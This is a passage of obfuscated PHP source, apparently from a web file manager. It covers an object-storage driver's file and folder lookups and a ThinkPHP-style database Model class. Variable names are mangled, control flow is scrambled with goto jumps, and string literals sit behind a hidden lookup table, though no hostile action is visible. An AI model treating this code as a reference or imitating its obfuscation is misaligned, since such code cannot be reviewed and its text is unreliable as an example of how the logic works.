$this->multiUploadAuthData($bÇšğ„Ş, $DÏŒ‡Ñõ© ); if (empty($CƒÒ…¦ à)) { return !1; } return array($fÛÉÎÖ÷È[228] => $CƒÒ…¦ à, $fÛÉÎÖ÷È[218] => $DÏŒ‡Ñõ© [$fÛÉÎÖ÷È[218]], $fÛÉÎÖ÷È[230] => $añÌ­ÕØÛÈ); goto A£‰“æÅöˆ; C†öŠÂ¤”‰: if (!$añÌ­ÕØÛÈ) { return !1; } unset($DÏŒ‡Ñõ© [$fÛÉÎÖ÷È[219]], $DÏŒ‡Ñõ© [$fÛÉÎÖ÷È[223]]); $DÏŒ‡Ñõ© [$fÛÉÎÖ÷È[89]] = $bÇšğ„Ş; goto c¸Œ‰µ¨ê; A£‰“æÅöˆ: } public function getHost() { return parent::getHost() . $_SERVER[ÈİÅ¿ÈÈ¥×][8] . $this->bucket; } public function size($B³¥æõÏ§…) { $Aªå­ç’® = $this->objectMeta($B³¥æõÏ§…); return $Aªå­ç’® ? $Aªå­ç’®[$_SERVER[ÈİÅ¿ÈÈ¥×][77]] : 0; } public function info($fÖœ²—ñƒ¹) { if ($this->isFolder($fÖœ²—ñƒ¹)) { return $this->folderInfo($fÖœ²—ñƒ¹); } else { if ($this->isFile($fÖœ²—ñƒ¹)) { return $this->fileInfo($fÖœ²—ñƒ¹); } } return !1; } public function exist($A»‰±»å¢é) { return $this->isFile($A»‰±»å¢é) || $this->isFolder($A»‰±»å¢é); } public function isFile($B·—‡Î¤¯ ) { return !$this->isFolder($B·—‡Î¤¯ ) && $this->objectMeta($B·—‡Î¤¯ ); } public function isFolder($A—¾ÔÜ†î²) { return $this->cacheMethod($_SERVER[ÈİÅ¿ÈÈ¥×][195], $A—¾ÔÜ†î²); } protected function objectMeta($A§±×Ú„ˆ´) { return $this->cacheMethod($_SERVER[ÈİÅ¿ÈÈ¥×][196], $A§±×Ú„ˆ´); } protected function _objectMeta($b¶¤ºŸñ¿˜) { $EÚ±×ôˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b¶¤ºŸñ¿˜ = rtrim($b¶¤ºŸñ¿˜, $EÚ±×ôˆ[8]); try { $B¯Õ”ÅÇçª = $this->client->getObjectInfo($this->bucket, $b¶¤ºŸñ¿˜); if (!isset($B¯Õ”ÅÇçª[$EÚ±×ôˆ[215]]) && isset($B¯Õ”ÅÇçª[$EÚ±×ôˆ[231]])) { $B¯Õ”ÅÇçª[$EÚ±×ôˆ[215]] = $B¯Õ”ÅÇçª[$EÚ±×ôˆ[231]]; } } catch (Exception $c¼æ–®´†”) { $B¯Õ”ÅÇçª = !1; } if (!$B¯Õ”ÅÇçª) { } return $B¯Õ”ÅÇçª; } protected function _isFolder($B‰ÑÎ½„ò×) { goto DÔ„§àÆÏ; f£èâ“Êƒ‰: $f¹¼‘ê–ò‡ = $this->client->getBucket($this->bucket, $B‰ÑÎ½„ò×, null, 1); if (empty($f¹¼‘ê–ò‡[$CççˆŸ‹ä‹[194]])) { return !1; } $EÉ³»ŠÖçñ = $f¹¼‘ê–ò‡[$CççˆŸ‹ä‹[194]][0][$CççˆŸ‹ä‹[28]]; goto døšğÏ¬‘; døšğÏ¬‘: if (substr($EÉ³»ŠÖçñ, -1) == $CççˆŸ‹ä‹[8]) { return !0; } if (get_path_this($EÉ³»ŠÖçñ) == get_path_this($B‰ÑÎ½„ò×)) { return !1; } return !0; goto c¤º‘×ø±Œ; DÔ„§àÆÏ: $CççˆŸ‹ä‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B‰ÑÎ½„ò× = rtrim($B‰ÑÎ½„ò×, $CççˆŸ‹ä‹[8]); if ($B‰ÑÎ½„ò× == $CççˆŸ‹ä‹[33] || $B‰ÑÎ½„ò× == $CççˆŸ‹ä‹[8]) { return !0; } goto f£èâ“Êƒ‰; c¤º‘×ø±Œ: } } define($_SERVER[ÈİÅ¿ÈÈ¥×][232], 1); goto aÃ”ŠŸ•£÷; DÖ¦Å¢Šçï: define($_SERVER[ÈİÅ¿ÈÈ¥×][236], 0); define($_SERVER[ÈİÅ¿ÈÈ¥×][237], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\x65", "\157\x72\x64\145\x72", "\x61\x6c\x69\x61\x73", "\x68\141\x76\x69\156\147", "\147\162\157\165\160", "\x6c\x6f\x63\153", "\144\151\x73\164\x69\156\x63\x74", "\x61\x75\x74\x6f", "\146\151\154\164\x65\162", "\166\141\154\151\144\141\164\x65", "\x72\145\163\x75\x6c\164", "\142\151\156\x64", "\164\x6f\x6b\145\156"); public function __construct($B¿ï­ƒ¡Æõ = '', $CÉÕíŸ“ß = '', $Dä„¨öñÅğ = '') { $fº¢¦¸œ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->_initialize(); if (!empty($B¿ï­ƒ¡Æõ)) { if (strpos($B¿ï­ƒ¡Æõ, $fº¢¦¸œ[91])) { list($this->dbName, $this->name) = explode($fº¢¦¸œ[91], $B¿ï­ƒ¡Æõ); } else { $this->name = $B¿ï­ƒ¡Æõ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($CÉÕíŸ“ß)) { $this->tablePrefix = $fº¢¦¸œ[33]; } elseif ($fº¢¦¸œ[33] != $CÉÕíŸ“ß) { $this->tablePrefix = $CÉÕíŸ“ß; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($fº¢¦¸œ[238]); } $this->db(0, empty($this->connection) ? $Dä„¨öñÅğ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $EØ‰Í¾ÓÇÑ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($this->fields)) { if (think_config($EØ‰Í¾ÓÇÑ[239])) { $AÑùà†êã = $this->dbName ? $this->dbName : think_config($EØ‰Í¾ÓÇÑ[240]); $a…Ìô×‰õŞ = think_var_cache($EØ‰Í¾ÓÇÑ[241] . strtolower(get_path_this($AÑùà†êã) . $EØ‰Í¾ÓÇÑ[91] . $this->name)); if ($a…Ìô×‰õŞ) { $cçøÅáÓØ  = think_config($EØ‰Í¾ÓÇÑ[242]); if (empty($cçøÅáÓØ ) || $a…Ìô×‰õŞ[$EØ‰Í¾ÓÇÑ[243]] == $cçøÅáÓØ ) { $this->fields = $a…Ìô×‰õŞ; return; } } } $this->flush(); } } public function flush() { goto fÅÇ»¯óÅï; eÜï¾Ç¡±±: if (!$DÄ÷²‰Ÿé) { return !1; } $this->fields = array_keys($DÄ÷²‰Ÿé); $this->fields[$AÖŠğ‹Á‰[244]] = !1; goto EËš’ÜÎå; fÅÇ»¯óÅï: $AÖŠğ‹Á‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->db->setModel($this->name); $DÄ÷²‰Ÿé = $this->db->getFields($this->getTableName()); goto eÜï¾Ç¡±±; BğÉÂåÑ–: if (think_config($AÖŠğ‹Á‰[239])) { $BÎ„ù•æï¬ = $this->dbName ? $this->dbName : think_config($AÖŠğ‹Á‰[240]); think_var_cache($AÖŠğ‹Á‰[241] . strtolower(get_path_this($BÎ„ù•æï¬) . $AÖŠğ‹Á‰[91] . $this->name), $this->fields); } goto FâÂµ¢Ùºª; EËš’ÜÎå: foreach ($DÄ÷²‰Ÿé as $cÃİ¾£ö½è => $B±õ“Ù×é¡) { $eŸŞˆ‚î¿Ï[$cÃİ¾£ö½è] = $B±õ“Ù×é¡[$AÖŠğ‹Á‰[29]]; if ($B±õ“Ù×é¡[$AÖŠğ‹Á‰[36]]) { $this->fields[$AÖŠğ‹Á‰[245]] = $cÃİ¾£ö½è; if ($B±õ“Ù×é¡[$AÖŠğ‹Á‰[39]]) { $this->fields[$AÖŠğ‹Á‰[244]] = !0; } } } $this->fields[$AÖŠğ‹Á‰[246]] = $eŸŞˆ‚î¿Ï; if (think_config($AÖŠğ‹Á‰[242])) { $this->fields[$AÖŠğ‹Á‰[243]] = think_config($AÖŠğ‹Á‰[242]); } goto BğÉÂåÑ–; FâÂµ¢Ùºª: } public function switchModel($e ¤İÄëÓ, $F¹Ö¿ÁÁ´‰ = array()) { $a°©îÎ×—² =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A¿“Éé»“˜ = ucwords(strtolower($e ¤İÄëÓ)) . $a°©îÎ×—²[247]; if (!class_exists($A¿“Éé»“˜)) { think_exception($A¿“Éé»“˜ . think_lang($a°©îÎ×—²[248])); } $this->_extModel = new $A¿“Éé»“˜($this->name); if (!empty($F¹Ö¿ÁÁ´‰)) { foreach ($F¹Ö¿ÁÁ´‰ as $FÛøÛïòõ‚) { $this->_extModel->setProperty($FÛøÛïòõ‚, $this->{$FÛøÛïòõ‚}); } } return $this->_extModel; } public function __set($eâ¨…åâà, $FïùŞË©–) { $this->data[$eâ¨…åâà] = $FïùŞË©–; } public function __get($bÇù¬š­¯) { return isset($this->data[$bÇù¬š­¯]) ? $this->data[$bÇù¬š­¯] : null; } public function __isset($AĞŸ¨îè‹) { return isset($this->data[$AĞŸ¨îè‹]); } public function __unset($EÚãö¨ßâ) { unset($this->data[$EÚãö¨ßâ]); } public function __call($eÀ¹Ô„šÓ‰, $dç‡ ìí½Ò) { $fíÓŞ¢¬È‘ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (in_array(strtolower($eÀ¹Ô„šÓ‰), $this->methods, !0)) { $this->options[strtolower($eÀ¹Ô„šÓ‰)] = $dç‡ ìí½Ò[0]; return $this; } elseif (in_array(strtolower($eÀ¹Ô„šÓ‰), array($fíÓŞ¢¬È‘[249], $fíÓŞ¢¬È‘[250], $fíÓŞ¢¬È‘[251], $fíÓŞ¢¬È‘[252], $fíÓŞ¢¬È‘[253]), !0)) { $BóØ‚æè­ = isset($dç‡ ìí½Ò[0]) ? $dç‡ ìí½Ò[0] : $fíÓŞ¢¬È‘[180]; $BóØ‚æè­ = $this->db->parseKey($BóØ‚æè­); return $this->getField(strtoupper($eÀ¹Ô„šÓ‰) . $fíÓŞ¢¬È‘[254] . $BóØ‚æè­ . $fíÓŞ¢¬È‘[255] . $eÀ¹Ô„šÓ‰, $fíÓŞ¢¬È‘[249]); } elseif (strtolower(substr($eÀ¹Ô„šÓ‰, 0, 5)) == $fíÓŞ¢¬È‘[256]) { $BóØ‚æè­ = think_parse_name(substr($eÀ¹Ô„šÓ‰, 5)); $DåĞÆºÈ²­[$BóØ‚æè­] = $dç‡ ìí½Ò[0]; return $this->where($DåĞÆºÈ²­)->find(); } elseif (strtolower(substr($eÀ¹Ô„šÓ‰, 0, 10)) == $fíÓŞ¢¬È‘[257]) { $EÚ»ó­’ÙŞ = think_parse_name(substr($eÀ¹Ô„šÓ‰, 10)); $DåĞÆºÈ²­[$EÚ»ó­’ÙŞ] = $dç‡ ìí½Ò[0]; return $this->where($DåĞÆºÈ²­)->getField($dç‡ ìí½Ò[1]); } elseif (isset($this->_scope[$eÀ¹Ô„šÓ‰])) { return $this->scope($eÀ¹Ô„šÓ‰, $dç‡ ìí½Ò[0]); } elseif (method_exists($this, $eÀ¹Ô„šÓ‰)) { array_unshift($dç‡ ìí½Ò, $eÀ¹Ô„šÓ‰); return call_user_func_array(array($this, $fíÓŞ¢¬È‘[258]), $dç‡ ìí½Ò); } else { return call_user_func_array(array(parent, $eÀ¹Ô„šÓ‰), $dç‡ ìí½Ò); } } protected function call() { goto bÜ¡µôÚã›; bÜ¡µôÚã›: $a¹‚ŠÄà¾ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CÆñ”‹Ëİ¢ = func_get_args(); $C›ŒíÎÁ‘ê = array_shift($CÆñ”‹Ëİ¢); goto f–›ğ¼Œƒà; aì‰‚³¦Â: if (isset($CÆñ”‹Ëİ¢[$eª¥ÌùâÌñ]) && $CÆñ”‹Ëİ¢[$eª¥ÌùâÌñ] === $C›ŒíÎÁ‘ê) { think_exception(__CLASS__ . $a¹‚ŠÄà¾[4] . $C›ŒíÎÁ‘ê . think_lang($a¹‚ŠÄà¾[259])); return; } $CÆñ”‹Ëİ¢[] = $C›ŒíÎÁ‘ê; if (method_exists($this, $a¹‚ŠÄà¾[260])) { $dóÆ˜åáä† = call_user_func_array(array($this, $a¹‚ŠÄà¾[261]), array($f¢òÑ¬‡á›, $CÆñ”‹Ëİ¢)); if (!is_null($dóÆ˜åáä†) && $dóÆ˜åáä† !== !1) { return $dóÆ˜åáä†; } } goto AíïÓÉİÉ×; f–›ğ¼Œƒà: $f¢òÑ¬‡á› = $C›ŒíÎÁ‘ê; if (is_array($C›ŒíÎÁ‘ê)) { $f¢òÑ¬‡á› = $C›ŒíÎÁ‘ê[1]; $C›ŒíÎÁ‘ê = $C›ŒíÎÁ‘ê[0]; } $eª¥ÌùâÌñ = count($CÆñ”‹Ëİ¢) - 1; goto aì‰‚³¦Â; AíïÓÉİÉ×: $bÔà×ÚğŒ = call_user_func_array(array($this, $C›ŒíÎÁ‘ê), $CÆñ”‹Ëİ¢); if (method_exists($this, $a¹‚ŠÄà¾[262])) { $dóÆ˜åáä† = call_user_func_array(array($this, $a¹‚ŠÄà¾[263]), array($f¢òÑ¬‡á›, $CÆñ”‹Ëİ¢, $bÔà×ÚğŒ)); if ($dóÆ˜åáä†) { return $dóÆ˜åáä†; } } return $bÔà×ÚğŒ; goto Dæ®ÚĞÁ“ê; Dæ®ÚĞÁ“ê: } protected function _initialize() { } protected function _facade($F‹ËÖ—ì³ª) { $bŞãä‹êô =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!empty($this->fields)) { foreach ($F‹ËÖ—ì³ª as $Bß—Ø‰Ô¯¬ => $dª’à¬µÏœ) { if (is_array($this->fields) && !in_array($Bß—Ø‰Ô¯¬, $this->fields, !0)) { unset($F‹ËÖ—ì³ª[$Bß—Ø‰Ô¯¬]); } elseif (is_scalar($dª’à¬µÏœ)) { $this->_parseType($F‹ËÖ—ì³ª, $Bß—Ø‰Ô¯¬); } } } if (!empty($this->options[$bŞãä‹êô[264]])) { $F‹ËÖ—ì³ª = array_map($this->options[$bŞãä‹êô[264]], $F‹ËÖ—ì³ª); unset($this->options[$bŞãä‹êô[264]]); } $this->_beforeWrite($F‹ËÖ—ì³ª); return $F‹ËÖ—ì³ª; } protected function _beforeWrite(&$b«º£µñ®) { } public function add($d›·¿‚¦¡“ = '', $A ©¾ãòç = array(), $E‘³Ä‡¤¡Á = false) { goto CÌÎ‡àŞ­; D¿³†§Ğïî: if (!1 === $this->_beforeInsert($d›·¿‚¦¡“, $A ©¾ãòç)) { return !1; } $Fœ§ëÆ³ø‚ = $this->db->insert($d›·¿‚¦¡“, $A ©¾ãòç, $E‘³Ä‡¤¡Á); if (!1 !== $Fœ§ëÆ³ø‚) { $dÌ˜©·á‚ = $this->getLastInsID(); if ($dÌ˜©·á‚) { $d›·¿‚¦¡“[$this->getPk()] = $dÌ˜©·á‚; $this->_after_insert($d›·¿‚¦¡“, $A ©¾ãòç); return $dÌ˜©·á‚; } $this->_after_insert($d›·¿‚¦¡“, $A ©¾ãòç); } goto dˆ™Ó¿‡Ã; dˆ™Ó¿‡Ã: return $Fœ§ëÆ³ø‚; goto F–ßµ Ï¤º; CÌÎ‡àŞ­: if (empty($d›·¿‚¦¡“)) { if (!empty($this->data)) { $d›·¿‚¦¡“ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ÈİÅ¿ÈÈ¥×][265]); return !1; } } $A ©¾ãòç = $this->_parseOptions($A ©¾ãòç); $d›·¿‚¦¡“ = $this->_facade($d›·¿‚¦¡“); goto D¿³†§Ğïî; F–ßµ Ï¤º: } protected function _beforeInsert(&$eÍùñÇ¦ß‚, $D‰´æºèë­) { } protected function _after_insert($Bâ½›ñÖ”, $D‹ ¹÷¼âˆ) { } public function addAll($A×ŞÃË›Á, $D…İŠ½åï— = array(), $BŸó•‹Ïä = false) { goto bÃÆÈ¬•à¢; B„À•È“ñÈ: foreach ($A×ŞÃË›Á as $D‹áé¨‰¢É => $aôèÁØ·Ÿ‚) { $A×ŞÃË›Á[$D‹áé¨‰¢É] = $this->_facade($aôèÁØ·Ÿ‚); } if (method_exists($this->db, $FŞ†°×Æ—¦[266])) { $B‚¶ÙÑğà = $this->db->insertAll($A×ŞÃË›Á, $D…İŠ½åï—, $BŸó•‹Ïä); } else { $this->startTrans(); foreach ($A×ŞÃË›Á as $D‹áé¨‰¢É => $aôèÁØ·Ÿ‚) { $B‚¶ÙÑğà = $this->db->insert($aôèÁØ·Ÿ‚, $D…İŠ½åï—, $BŸó•‹Ïä); } $this->commit(); } if (!1 !== $B‚¶ÙÑğà) { $aËÀº‰÷· = $this->getLastInsID(); if ($aËÀº‰÷·) { return $aËÀº‰÷·; } } goto aº“›ˆ”Íí; aº“›ˆ”Íí: return $B‚¶ÙÑğà; goto a¶Æä¢×…­; bÃÆÈ¬•à¢: $FŞ†°×Æ—¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($A×ŞÃË›Á)) { $this->error = think_lang($FŞ†°×Æ—¦[265]); return !1; } $D…İŠ½åï— = $this->_parseOptions($D…İŠ½åï—); goto B„À•È“ñÈ; a¶Æä¢×…­: } public function selectAdd($F¾‘á®ğö = '', $fŞ¼ö…ªÊÏ = '', $Aªï»¥ìÍË = array()) { $D±·İ¯ÁÏ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Aªï»¥ìÍË = $this->_parseOptions($Aªï»¥ìÍË); if (!1 === ($fÀ…Š¹Äö = $this->db->selectInsert($F¾‘á®ğö ? $F¾‘á®ğö : $Aªï»¥ìÍË[$D±·İ¯ÁÏ[267]], $fŞ¼ö…ªÊÏ ? $fŞ¼ö…ªÊÏ : $this->getTableName(), $Aªï»¥ìÍË))) { $this->error = think_lang($D±·İ¯ÁÏ[268]); return !1; } else { return $fÀ…Š¹Äö; } } public function save($f‘ßÑÔÕì = '', $D¶¶îˆªåŒ = array()) { goto e¿‡„­á·; A¨ºÎ •§: $D¶¶îˆªåŒ = $this->_parseOptions($D¶¶îˆªåŒ); $f¨‡¥‡øª = $this->getPk(); if (!isset($D¶¶îˆªåŒ[$CÉ¸İ«Ï¦[269]])) { if (isset($f‘ßÑÔÕì[$f¨‡¥‡øª])) { $A‚¼¢íˆäá[$f¨‡¥‡øª] = $f‘ßÑÔÕì[$f¨‡¥‡øª]; $D¶¶îˆªåŒ[$CÉ¸İ«Ï¦[269]] = $A‚¼¢íˆäá; unset($f‘ßÑÔÕì[$f¨‡¥‡øª]); } else { $this->error = think_lang($CÉ¸İ«Ï¦[268]); return !1; } } goto c©˜«¡¹Ô; e¿‡„­á·: $CÉ¸İ«Ï¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($f‘ßÑÔÕì)) { if (!empty($this->data)) { $f‘ßÑÔÕì = $this->data; $this->data = array(); } else { $this->error = think_lang($CÉ¸İ«Ï¦[265]); return !1; } } $f‘ßÑÔÕì = $this->_facade($f‘ßÑÔÕì); goto A¨ºÎ •§; a˜ÒÜÂ¹¼®: if (!1 !== $c±ÍØÕçë) { if (isset($aš¡õ•ƒÆˆ)) { $f‘ßÑÔÕì[$f¨‡¥‡øª] = $aš¡õ•ƒÆˆ; } $this->_afterUpdate($f‘ßÑÔÕì, $D¶¶îˆªåŒ); } return $c±ÍØÕçë; goto dÛ‚¤ùµŠ¾; c©˜«¡¹Ô: if (is_array($D¶¶îˆªåŒ[$CÉ¸İ«Ï¦[269]]) && isset($D¶¶îˆªåŒ[$CÉ¸İ«Ï¦[269]][$f¨‡¥‡øª])) { $aš¡õ•ƒÆˆ = $D¶¶îˆªåŒ[$CÉ¸İ«Ï¦[269]][$f¨‡¥‡øª]; } if (!1 === $this->_beforeUpdate($f‘ßÑÔÕì, $D¶¶îˆªåŒ)) { return !1; } $c±ÍØÕçë = $this->db->update($f‘ßÑÔÕì, $D¶¶îˆªåŒ); goto a˜ÒÜÂ¹¼®; dÛ‚¤ùµŠ¾: } protected function _beforeUpdate(&$BÆµÒÁ”½, $B³¦ë¾»¬½) { } protected function _afterUpdate($BÄ®·§ôè, $A©™­ÀÇ®¶) { } public function delete($B‘ÔˆÕÚØ‡ = array()) { goto d‚¨…Ç›â±; E ã‹òŠœ: $Dä‰¾–‡¿À = $this->db->delete($B‘ÔˆÕÚØ‡); if (!1 !== $Dä‰¾–‡¿À) { $fÇøŸâİÀ– = array(); if (isset($F®»„„¸ÇŸ)) { $fÇøŸâİÀ–[$b›½­™Şå¤] = $F®»„„¸ÇŸ; } $this->_after_delete($fÇøŸâİÀ–, $B‘ÔˆÕÚØ‡); } return $Dä‰¾–‡¿À; goto AÃ°¾•‚‚; d‚¨…Ç›â±: $dç¯¶øá®» =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($B‘ÔˆÕÚØ‡) && empty($this->options[$dç¯¶øá®»[269]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $b›½­™Şå¤ = $this->getPk(); goto c¸¥¤¨‡“—; c¸¥¤¨‡“—: if (is_numeric($B‘ÔˆÕÚØ‡) || is_string($B‘ÔˆÕÚØ‡)) { if (strpos($B‘ÔˆÕÚØ‡, $dç¯¶øá®»[47])) { $aƒ¤¬ŞÌôÀ[$b›½­™Şå¤] = array($dç¯¶øá®»[270], $B‘ÔˆÕÚØ‡); } else { $aƒ¤¬ŞÌôÀ[$b›½­™Şå¤] = $B‘ÔˆÕÚØ‡; } $this->options[$dç¯¶øá®»[269]] = $aƒ¤¬ŞÌôÀ; } $B‘ÔˆÕÚØ‡ = $this->_parseOptions(); if (is_array($B‘ÔˆÕÚØ‡[$dç¯¶øá®»[269]]) && isset($B‘ÔˆÕÚØ‡[$dç¯¶øá®»[269]][$b›½­™Şå¤])) { $F®»„„¸ÇŸ = $B‘ÔˆÕÚØ‡[$dç¯¶øá®»[269]][$b›½­™Şå¤]; } goto E ã‹òŠœ; AÃ°¾•‚‚: } protected function _after_delete($EÓ©ì©Úßƒ, $féõ±‚óÖÅ) { } public function select($bÀéÅÛøŸÇ = array()) { goto a¼ˆ¤Ò‚Ã‡; fÊ‹Øˆçƒ³: $this->_afterSelect($AöØ™ŠÔêê, $bÀéÅÛøŸÇ); return $AöØ™ŠÔêê; goto fÃîƒøÔ»Æ; D÷ª¢İÂ£¼: $AöØ™ŠÔêê = $this->db->select($bÀéÅÛøŸÇ); if (!1 === $AöØ™ŠÔêê) { return !1; } if (empty($AöØ™ŠÔêê)) { return null; } goto fÊ‹Øˆçƒ³; a¼ˆ¤Ò‚Ã‡: $AÏê­œÍÉ© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (is_string($bÀéÅÛøŸÇ) || is_numeric($bÀéÅÛøŸÇ)) { $A¼Ã‹ï‘Ô = $this->getPk(); if (strpos($bÀéÅÛøŸÇ, $AÏê­œÍÉ©[47])) { $c…®¨ƒìñ[$A¼Ã‹ï‘Ô] = array($AÏê­œÍÉ©[270], $bÀéÅÛøŸÇ); } else { $c…®¨ƒìñ[$A¼Ã‹ï‘Ô] = $bÀéÅÛøŸÇ; } $this->options[$AÏê­œÍÉ©[269]] = $c…®¨ƒìñ; } elseif (!1 === $bÀéÅÛøŸÇ) { $bÀéÅÛøŸÇ = $this->_parseOptions(); return $AÏê­œÍÉ©[271] . $this->db->buildSelectSql($bÀéÅÛøŸÇ) . $AÏê­œÍÉ©[272]; } $bÀéÅÛøŸÇ = $this->_parseOptions(); goto D÷ª¢İÂ£¼; fÃîƒøÔ»Æ: } protected function _afterSelect(&$Aİ˜”ÓÜÔ…, $aÍ†ö»×ëÃ) { } public function buildSql($eÂ”½ƒÉ¹Ë = array()) { $bµÜì½äğ¡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eÂ”½ƒÉ¹Ë = $this->_parseOptions($eÂ”½ƒÉ¹Ë); return $bµÜì½äğ¡[271] . $this->db->buildSelectSql($eÂ”½ƒÉ¹Ë) . $bµÜì½äğ¡[272]; } public function optionsValue($fô°­•Ï’ = null) { if (is_null($fô°­•Ï’)) { return $this->options; } elseif (is_array($fô°­•Ï’)) { $this->options = array_merge($this->options, $fô°­•Ï’); } } protected function _parseOptions($DÉµ°ä±ô = array()) { goto FĞ¸Í¹ÑØª; d¨…Õ¾½¥Ô: if (isset($DÉµ°ä±ô[$CäïÖÒ¬Û¶[269]]) && is_array($DÉµ°ä±ô[$CäïÖÒ¬Û¶[269]]) && !empty($CÉõø”»„) && !isset($DÉµ°ä±ô[$CäïÖÒ¬Û¶[276]]) && !isset($DÉµ°ä±ô[$CäïÖÒ¬Û¶[273]])) { foreach ($DÉµ°ä±ô[$CäïÖÒ¬Û¶[269]] as $AµÏ±ÚÏÕò => $bñÏ¿‘©Ñ) { $AµÏ±ÚÏÕò = trim($AµÏ±ÚÏÕò); if (in_array($AµÏ±ÚÏÕò, $CÉõø”»„, !0)) { if (is_scalar($bñÏ¿‘©Ñ)) { $this->_parseType($DÉµ°ä±ô[$CäïÖÒ¬Û¶[269]], $AµÏ±ÚÏÕò); } } elseif (!is_numeric($AµÏ±ÚÏÕò) && $CäïÖÒ¬Û¶[70] != substr($AµÏ±ÚÏÕò, 0, 1) && !1 === strpos($AµÏ±ÚÏÕò, $CäïÖÒ¬Û¶[91]) && !1 === strpos($AµÏ±ÚÏÕò, $CäïÖÒ¬Û¶[254]) && !1 === strpos($AµÏ±ÚÏÕò, $CäïÖÒ¬Û¶[277]) && !1 === strpos($AµÏ±ÚÏÕò, $CäïÖÒ¬Û¶[278])) { unset($DÉµ°ä±ô[$CäïÖÒ¬Û¶[269]][$AµÏ±ÚÏÕò]); } } } $this->_options_filter($DÉµ°ä±ô); return $DÉµ°ä±ô; goto CÃ¨‹«’Äµ; c¾®ç‡ ·¤: if (!isset($DÉµ°ä±ô[$CäïÖÒ¬Û¶[273]])) { $DÉµ°ä±ô[$CäïÖÒ¬Û¶[273]] = $this->getTableName(); $CÉõø”»„ = $this->fields; } else { $CÉõø”»„ = $this->getDbFields(); } if (!empty($DÉµ°ä±ô[$CäïÖÒ¬Û¶[274]])) { $DÉµ°ä±ô[$CäïÖÒ¬Û¶[273]] .= $CäïÖÒ¬Û¶[50] . $DÉµ°ä±ô[$CäïÖÒ¬Û¶[274]]; } $DÉµ°ä±ô[$CäïÖÒ¬Û¶[275]] = $this->name; goto d¨…Õ¾½¥Ô; FĞ¸Í¹ÑØª: $CäïÖÒ¬Û¶ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (is_array($DÉµ°ä±ô)) { $DÉµ°ä±ô = array_merge($this->options, $DÉµ°ä±ô); } $this->options = array(); goto c¾®ç‡ ·¤; CÃ¨‹«’Äµ: } protected function _options_filter(&$c¨ë™¦‘‚) { } protected function _parseType(&$BÎ½›Éê¨, $aª¯Ì™æùï) { $AĞµ®ÁÜÕ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($this->options[$AĞµ®ÁÜÕ[279]][$AĞµ®ÁÜÕ[4] . $aª¯Ì™æùï])) { $dƒÂ¨à‹ÎÔ = strtolower($this->fields[$AĞµ®ÁÜÕ[246]][$aª¯Ì™æùï]); if (!1 !== strpos($dƒÂ¨à‹ÎÔ, $AĞµ®ÁÜÕ[280])) { } elseif (!1 === strpos($dƒÂ¨à‹ÎÔ, $AĞµ®ÁÜÕ[281]) && !1 !== strpos($dƒÂ¨à‹ÎÔ, $AĞµ®ÁÜÕ[282])) { $BÎ½›Éê¨[$aª¯Ì™æùï] = intval($BÎ½›Éê¨[$aª¯Ì™æùï]); } elseif (!1 !== strpos($dƒÂ¨à‹ÎÔ, $AĞµ®ÁÜÕ[283]) || !1 !== strpos($dƒÂ¨à‹ÎÔ, $AĞµ®ÁÜÕ[284])) { $BÎ½›Éê¨[$aª¯Ì™æùï] = floatval($BÎ½›Éê¨[$aª¯Ì™æùï]); } elseif (!1 !== strpos($dƒÂ¨à‹ÎÔ, $AĞµ®ÁÜÕ[285])) { $BÎ½›Éê¨[$aª¯Ì™æùï] = (bool) $BÎ½›Éê¨[$aª¯Ì™æùï]; } } } public function find($DÖ‹½ßá«± = array()) { goto c´‚ÖÊÏéš; BæÒ˜é’¯‚: if (!empty($this->options[$c¤®ñêà[287]])) { return $this->returnResult($this->data, $this->options[$c¤®ñêà[287]]); } return $this->data; goto AÂÂ´÷Œ‘Ÿ; c´‚ÖÊÏéš: $c¤®ñêà =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (is_numeric($DÖ‹½ßá«±) || is_string($DÖ‹½ßá«±)) { $bòà‚‡‚¸[$this->getPk()] = intval($DÖ‹½ßá«±); $this->options[$c¤®ñêà[269]] = $bòà‚‡‚¸; } $this->options[$c¤®ñêà[286]] = 1; goto EÓê¡‰ğ—; cõÏ”£ÇÜÃ: if (empty($Aé‰ÌñÙĞ)) { return null; } $this->data = $Aé‰ÌñÙĞ[0]; $this->_afterFind($this->data, $DÖ‹½ßá«±); goto BæÒ˜é’¯‚; EÓê¡‰ğ—: $DÖ‹½ßá«± = $this->_parseOptions(); $Aé‰ÌñÙĞ = $this->db->select($DÖ‹½ßá«±); if (!1 === $Aé‰ÌñÙĞ) { return !1; } goto cõÏ”£ÇÜÃ; AÂÂ´÷Œ‘Ÿ: } protected function _afterFind(&$EÂÓÜƒ‹å, $f”—¨¦‘ŒÁ) { } protected function returnResult($B»´¸ùµÑŸ, $c­Ğè¶„ˆ› = '') { 